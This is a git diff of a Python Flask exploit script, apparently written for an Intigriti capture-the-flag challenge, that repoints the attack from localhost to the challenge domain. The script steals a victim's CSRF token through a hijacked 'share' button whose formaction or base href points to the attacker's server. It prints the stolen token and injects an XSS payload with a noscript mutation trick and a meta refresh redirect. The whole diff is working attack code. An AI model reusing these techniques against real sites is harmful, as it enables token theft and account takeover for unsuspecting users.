@@ -4,8 +4,9 @@ from flask import Flask, render_template, request, redirect, url_for, flash, g
 import requests
 import os
 
-TARGET_DOMAIN = "http://127.0.0.1:1337"
-HOST_DOMAIN = "http://127.0.0.1:5001"
+TARGET_DOMAIN = "https://challenge-1222.intigriti.io"
+HOST_PORT = 5001
+HOST_DOMAIN = "http://127.0.0.1"
 PROXIES = {}
 
 VARIANT = 1
@@ -18,12 +19,7 @@ def index_view(user_id=None):
     csrf_token = request.form['csrf_token']
     url = create_csrf(csrf_token)
     print(f"Stolen token: {csrf_token}")
-
-    page = f"""
-    <iframe src={url}?share width=500 height=500></iframe>
-    <meta http-equiv="refresh" content="2; URL={TARGET_DOMAIN}/edit">
-    """
-    return page # redirect(url)
+    return redirect(url + "?share") # page
 
 def publish_blog(content):
     session = requests.Session()
@@ -54,8 +50,9 @@ def publish_blog(content):
 
 def create_csrf(csrf_token):
     if VARIANT == 1:
-        xss_payload = '''
+        xss_payload = f'''
             comment"); alert(document.querySelector("a.navbar-brand").innerText.split("-")[1]);//
+            <meta http-equiv=refresh content="1; URL={TARGET_DOMAIN}/edit">
             <noscript><p title='</noscript>&lt;/TEXTAREA&gt; <div></div></FORM><xx swallow="'>
             </p></noscript>
         '''
@@ -87,14 +84,14 @@ def create_csrf(csrf_token):
 def prepare():    
     if VARIANT == 1:
         content = f"""
-            <input id="share-button" formaction="{HOST_DOMAIN}" type="submit" form="comment-form">
+            <input id="share-button" formaction="{HOST_DOMAIN}:{HOST_PORT}" type="submit" form="comment-form">
                 DO NOT CLICK ME
             </input>
         """
 
     if VARIANT == 2:
         content = f"""
-            <base href="{HOST_DOMAIN}">
+            <base href="{HOST_DOMAIN}:{HOST_PORT}">
             <input id="share-button" type="submit" form="comment-form">
                 DO NOT CLICK ME
             </input>
@@ -105,4 +102,4 @@ def prepare():
     
 if __name__ == '__main__':
     prepare()
-    app.run(port=5001)
+    app.run(port=HOST_PORT)
